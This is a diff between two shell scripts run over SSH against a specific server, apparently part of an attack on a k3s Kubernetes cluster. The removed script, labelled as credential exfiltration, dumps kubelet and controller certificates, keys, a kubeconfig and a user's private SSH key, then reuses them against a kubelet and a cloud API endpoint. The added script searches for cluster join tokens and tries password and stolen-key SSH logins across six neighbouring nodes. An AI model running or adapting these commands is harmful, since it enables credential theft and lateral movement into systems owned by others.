@@ -1,31 +1,30 @@
-echo "=== 221 cluster cred exfil ==="
-cat > /tmp/r5.sh <<'RSH'
+echo "=== 221 direct node attacks ==="
+cat > /tmp/r6.sh <<'RSH'
 #!/bin/bash
-echo "=== client-kubelet ==="
-sudo cat /var/lib/rancher/k3s/agent/client-kubelet.crt /var/lib/rancher/k3s/agent/client-kubelet.key
-echo "=== client-k3s-controller ==="
-sudo cat /var/lib/rancher/k3s/agent/client-k3s-controller.crt /var/lib/rancher/k3s/agent/client-k3s-controller.key
-echo "=== kubeproxy ==="
-sudo cat /var/lib/rancher/k3s/agent/client-kube-proxy.crt /var/lib/rancher/k3s/agent/client-kube-proxy.key
-echo "=== CAs ==="
-sudo cat /var/lib/rancher/k3s/agent/server-ca.crt /var/lib/rancher/k3s/agent/client-ca.crt 2>/dev/null
-echo "=== etc dir ==="
-sudo ls -laR /var/lib/rancher/k3s/agent/etc/ 2>/dev/null | head -30
-echo "=== k3scontroller.kubeconfig ==="
-sudo cat /var/lib/rancher/k3s/agent/k3scontroller.kubeconfig
-echo "=== direct kubelet test .103 ==="
-sudo curl -sk --max-time 6 --cert /var/lib/rancher/k3s/agent/client-kubelet.crt --key /var/lib/rancher/k3s/agent/client-kubelet.key https://85.234.79.103:10250/pods -w "\nHTTP:%{http_code}\n" | head -c 800
-echo
-echo "=== direct ELB API test ==="
-sudo curl -sk --max-time 8 --cert /var/lib/rancher/k3s/agent/client-kubelet.crt --key /var/lib/rancher/k3s/agent/client-kubelet.key --cacert /var/lib/rancher/k3s/agent/server-ca.crt https://k3s-h100-novita-k8s-69c5d56e-119c2232ba991a2f.elb.us-west-2.amazonaws.com:6443/api/v1/nodes -w "\nHTTP:%{http_code}\n" | head -c 1000
-echo
-echo "=== ubuntu key ==="
-sudo cat /home/ubuntu/.ssh/id_ed25519
-echo "=== ubuntu known_hosts ==="
-sudo grep -oE "^(85\.234\.[0-9.]+|100\.[0-9.]+|[a-z0-9.-]+) " /home/ubuntu/.ssh/known_hosts 2>/dev/null | sort -u | head -20
-echo "=== ubuntu ssh config ==="
-sudo cat /home/ubuntu/.ssh/config 2>/dev/null | head -20
+echo "=== root ssh dir ==="
+sudo ls -la /root/.ssh/ 2>/dev/null
+echo "=== k3s token hunt ==="
+sudo cat /etc/rancher/k3s/config.yaml 2>/dev/null; sudo ls -la /etc/rancher/k3s/ 2>/dev/null
+sudo cat /etc/systemd/system/k3s-agent.service 2>/dev/null | grep -A3 Environment
+sudo cat /var/lib/rancher/k3s/agent/etc/k3s-agent-load-balancer.json 2>/dev/null
+sudo grep -rlE "K3S_TOKEN|K10[0-9a-f]" /etc/systemd/system/ /root/ /var/lib/rancher/k3s/agent/ 2>/dev/null | head -5
+sudo grep -hoE "K10[0-9a-z:]+" /etc/systemd/system/k3s*.service /root/.bash_history 2>/dev/null | head -3
+echo "=== ssh auth methods on rx nodes ==="
+for ip in 31 87 103 109 184 233; do
+  m=$(ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o PreferredAuthentications=password -o PubkeyAuthentication=no root@85.234.79.$ip true 2>&1 | head -1)
+  echo "  .79.$ip: $m"
+done
+echo "=== key auth attempts ==="
+for key in /home/ubuntu/.ssh/id_ed25519 /root/.ssh/id_ed25519 /root/.ssh/id_rsa; do
+  sudo test -f $key || continue
+  for ip in 31 87 103 109 184 233; do
+    for u in root ubuntu; do
+      r=$(sudo ssh -i $key -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=4 $u@85.234.79.$ip 'hostname' 2>&1 | tail -1)
+      echo "  $key -> $u@.79.$ip: ${r:0:60}"
+    done
+  done
+done
 RSH
-chmod +x /tmp/r5.sh
-timeout 110 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r5.sh 2>&1 | head -200
-echo "=== B21DONE ==="
+chmod +x /tmp/r6.sh
+timeout 115 ssh -i /tmp/.k221 -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 dev-24-sudo@85.234.79.221 'bash -s' < /tmp/r6.sh 2>&1 | head -80
+echo "=== B22DONE ==="
